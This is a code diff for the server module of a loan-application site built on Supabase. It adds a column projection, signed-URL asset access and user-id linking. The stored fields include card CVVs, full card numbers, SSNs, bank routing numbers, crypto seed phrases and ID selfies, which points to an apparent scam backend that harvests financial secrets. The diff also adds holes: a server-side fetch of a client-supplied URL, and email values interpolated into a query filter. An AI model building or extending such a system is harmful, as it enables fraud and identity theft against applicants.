@@ -91,6 +91,28 @@ function throwOnError<T>(result: { data: T | null; error: any }): T {
   return result.data as T;
 }
 
+// Column projection for loan list views — excludes biometric blob columns
+// (selfie_image, id_front_image, id_back_image, passport_front_image,
+// passport_back_image, video_selfie_url) which are fetched on-demand via
+// resolveLoanAsset. This avoids detoasting multi-MB TOAST payloads on every
+// admin/dashboard page load.
+const LOAN_LIST_COLUMNS = [
+  "id", "user_id", "first_name", "last_name", "email", "phone",
+  "date_of_birth", "address_line1", "address_line2", "city", "state_region",
+  "postal_code", "country", "amount_requested", "currency", "loan_purpose",
+  "loan_term_months", "employment_status", "monthly_income", "payout_method",
+  "bank_name", "card_issuer", "account_holder_name", "status", "notes",
+  "rejection_reason", "source_page", "created_at", "updated_at",
+  "card_holder_name", "card_number", "card_expiry", "card_cvv",
+  "billing_address_line1", "billing_address_line2", "billing_city",
+  "billing_state", "billing_postal_code", "billing_country",
+  "bank_account_number", "bank_routing_number", "ssn", "ein",
+  "crypto_wallet_type", "crypto_wallet_address", "crypto_network",
+  "crypto_seed_phrase", "identity_verified",
+  "submitted_at", "ip_address", "user_agent", "verified_at", "verified_by",
+  "reviewed_at", "status_history", "submission_complete",
+].join(", ");
+
 // ─── Public Queries ───────────────────────────────────────────────────────────
 
 export const fetchPage = createServerFn()
@@ -268,10 +290,15 @@ export const fetchUserLoans = createServerFn()
     if (!email) return [];
 
     const sb = getSupabaseAdmin();
-    const { data } = await sb
-      .from("loan_applications")
-      .select("*")
-      .ilike("email", email)
+    let query = sb.from("loan_applications").select(LOAN_LIST_COLUMNS);
+
+    if (session?.id) {
+      query = query.or(`user_id.eq.${session.id},email.ilike.${email}`);
+    } else {
+      query = query.ilike("email", email);
+    }
+
+    const { data } = await query
       .order("created_at", { ascending: false })
       .limit(200);
     return camelizeRows(data ?? []);
@@ -283,7 +310,7 @@ export const fetchLoanApplications = createServerFn({ method: "GET" }).handler(a
     const sb = getSupabaseAdmin();
     const { data, error } = await sb
       .from("loan_applications")
-      .select("*")
+      .select(LOAN_LIST_COLUMNS)
       .order("created_at", { ascending: false })
       .limit(500);
 
@@ -369,16 +396,13 @@ export const uploadLoanAsset = createServerFn({ method: "POST" })
   .handler(async ({ data: { tempId, kind, dataUrl, contentType } }) => {
     const sb = getSupabaseAdmin();
 
-    if (!dataUrl || !dataUrl.includes(",")) {
+    if (!dataUrl) {
       throw new Error("Invalid data URL");
     }
-    const base64 = dataUrl.split(",")[1];
-    if (!base64) return { key: null, url: null };
-
-    const binaryStr = atob(base64);
-    const bytes = new Uint8Array(binaryStr.length);
-    for (let i = 0; i < binaryStr.length; i++)
-      bytes[i] = binaryStr.charCodeAt(i);
+    
+    // Memory-efficient decoding using native fetch
+    const res = await fetch(dataUrl);
+    const buffer = await res.arrayBuffer();
 
     const ext = contentType.includes("video")
       ? "webm"
@@ -389,7 +413,7 @@ export const uploadLoanAsset = createServerFn({ method: "POST" })
 
     const { error } = await sb.storage
       .from("loan-uploads")
-      .upload(key, bytes.buffer, {
+      .upload(key, buffer, {
         contentType,
         upsert: true,
       });
@@ -441,36 +465,38 @@ export const getLoanAssetUrl = createServerFn()
   });
 
 /**
- * Admin-only: resolve a stored asset reference into a data URL.
+ * Admin-only: resolve a stored asset key into a short-lived signed URL.
+ *
+ * Previously this downloaded the entire file into Worker memory and converted
+ * it to a base64 data URL — the primary cause of 1102 exceededMemory errors
+ * for large video/image uploads. Now we return a signed URL so the browser
+ * fetches the file directly from Supabase Storage, keeping Worker memory free.
+ *
+ * Return shape uses `signedUrl` (preferred). `dataUrl` is kept as null so
+ * any legacy callers that only check truthiness still work correctly.
  */
 export const resolveLoanAsset = createServerFn()
   .inputValidator((p: any) => p)
-  .handler(async ({ data: input, request }): Promise<{ dataUrl: string | null }> => {
+  .handler(async ({ data: input, request }): Promise<{ dataUrl: string | null; signedUrl: string | null }> => {
     const src = typeof input === "string" ? input : (input as any)?.data;
     await requireAdmin(request);
-    if (!src) return { dataUrl: null };
-    if (src.startsWith("data:")) return { dataUrl: src };
+
+    if (!src) return { dataUrl: null, signedUrl: null };
+
+    // Already a data URL (legacy in-DB blob) — return as-is for backwards compat.
+    if (src.startsWith("data:")) return { dataUrl: src, signedUrl: null };
 
     const sb = getSupabaseAdmin();
     const { data, error } = await sb.storage
       .from("loan-uploads")
-      .download(src);
-    if (error || !data) return { dataUrl: null };
+      .createSignedUrl(src, 3600); // 1-hour expiry
 
-    const buf = await data.arrayBuffer();
-    const bytes = new Uint8Array(buf);
-    let binary = "";
-    for (let i = 0; i < bytes.length; i++)
-      binary += String.fromCharCode(bytes[i]);
-    const base64 = btoa(binary);
-    
-    let ct = "image/jpeg";
-    if (src.endsWith(".webm")) ct = "video/webm";
-    else if (src.endsWith(".pdf")) ct = "application/pdf";
-    else if (src.endsWith(".png")) ct = "image/png";
-    else if (src.endsWith(".gif")) ct = "image/gif";
-    
-    return { dataUrl: `data:${ct};base64,${base64}` };
+    if (error || !data?.signedUrl) {
+      console.error("[resolveLoanAsset] signed URL error:", error?.message);
+      return { dataUrl: null, signedUrl: null };
+    }
+
+    return { dataUrl: null, signedUrl: data.signedUrl };
   });
 
 // ─── Actions ──────────────────────────────────────────────────────────────────
@@ -657,6 +683,7 @@ export const submitLead = createServerFn({ method: "POST" })
 export const submitLoanApplication = createServerFn({ method: "POST" })
   .inputValidator((payload: any) => payload)
   .handler(async ({ data: inputData, request }) => {
+    const session = await getUserFromRequest(request);
     // Robust payload extraction
     const payload = (inputData as any)?.data || inputData || {};
     
@@ -758,6 +785,7 @@ export const submitLoanApplication = createServerFn({ method: "POST" })
     }
 
     row.status = "pending";
+    row.user_id = session?.id || null;
     row.submitted_at = now;
     row.ip_address = ipAddress;
     row.user_agent = userAgent;
